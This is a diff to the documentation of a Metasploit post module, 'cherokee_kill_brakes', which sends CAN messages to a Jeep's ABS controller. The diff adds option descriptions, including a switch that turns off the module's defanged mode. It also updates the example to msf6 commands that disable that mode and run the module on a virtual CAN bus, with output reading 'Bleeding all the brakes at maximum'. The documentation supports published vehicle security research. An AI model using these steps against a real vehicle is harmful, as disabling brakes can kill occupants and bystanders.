@@ -8,7 +8,7 @@ http://www.illmatics.com/Remote%20Car%20Hacking.pdf
 
 Authors:
 Charlie Miller # Original Author and Researcher 
-Chris Valasek# Original Author and Researcher
+Chris Valasek # Original Author and Researcher
 Jay Turla # Metasploit Module
 
 ## Verification Steps
@@ -40,6 +40,15 @@ Module options (post/hardware/automotive/cherokee_kill_brakes):
    SESSION                   yes       The session to run this module on.
 ```
 
+**CANBUS**
+CAN Bus to perform scan on, defaults to connected bus
+
+**SESSION**
+The session to run this module on.
+
+**DefangedMode**
+Set this to `false` to disable defanged mode and enable module functionality. Set this only if you're SURE you want to proceed.
+
 ## Scenarios
 You can test this module doing a candump wherein the first CAN Frame will start a diagnostic session with the ABS ECU and then bleed all the brakes at maximum which contains one message (InputOutput) but requires multiple CAN messages since the data is too long to fit in a single CAN frame.
 
@@ -64,14 +73,18 @@ Active sessions
   --  ----  ----                   -----------  ----------
   1         hwbridge cmd/hardware  automotive   127.0.0.1 -> 127.0.0.1 (127.0.0.1)
 
-msf5 auxiliary(client/hwbridge/connect) > sessions -i 1
-[*] Starting interaction with 1...
-
-hwbridge > run post/hardware/automotive/cherokee_kill_brakes CANBUS=vcan0
+msf6 auxiliary(client/hwbridge/connect) > use post/hardware/automotive/cherokee_kill_brakes
+msf6 post(hardware/automotive/cherokee_kill_brakes) > set session 1
+session => 1
+msf6 post(hardware/automotive/cherokee_kill_brakes) > set CANBUS vcan0
+CANBUS => vcan0
+msf6 post(hardware/automotive/cherokee_kill_brakes) > set VERBOSE true
+msf6 post(hardware/automotive/cherokee_kill_brakes) > set DefangedMode false
+msf6 post(hardware/automotive/cherokee_kill_brakes) > run
 
 [*] Starting a diagnostic session with the ABS ECU...
 [*] -- Bleeding all the brakes at maximum --
-hwbridge > 
+[*] Post module execution completed
 ```
 
 You can use candump to verify the CAN frames being sent:
